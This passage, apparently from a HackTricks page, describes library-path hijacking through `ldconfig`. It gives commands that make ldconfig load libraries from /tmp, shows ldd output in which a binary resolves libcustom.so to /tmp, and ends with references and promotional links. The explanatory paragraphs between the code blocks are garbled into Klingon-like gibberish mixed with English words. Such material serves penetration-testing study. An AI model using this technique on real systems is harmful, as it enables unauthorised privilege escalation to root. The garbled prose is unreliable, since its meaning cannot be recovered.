You can indicate `ldconfig` **where to load the conf files from**, so we can take advantage of it to make `ldconfig` load arbitrary folders.\
So, lets create the files and folders needed to load "/tmp":
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
nuqneH, **ghItlhvam vItlhutlh** vItlhutlh `/tmp` **Daq**.\
'ej nItebHa' 'e' vItlhutlh vItlhutlh 'ej **'ej vItlhutlh binary vItlhutlh vItlhutlh** vItlhutlh:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Qapla'!** QaH sudo privileges 'e' vItlhutlh 'e' `ldconfig` vuD. 

{% hint style="info" %}
`ldconfig` **suid bit** laH vItlhutlh 'e' vuln 'oH. 'ej 'e' vItlhutlh 'e' error appear: `/sbin/ldconfig.real: Can't create temporary cache file /etc/ld.so.cache~: Permission denied`
{% endhint %}

## References

* [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
* [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
* Dab machine in HTB

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
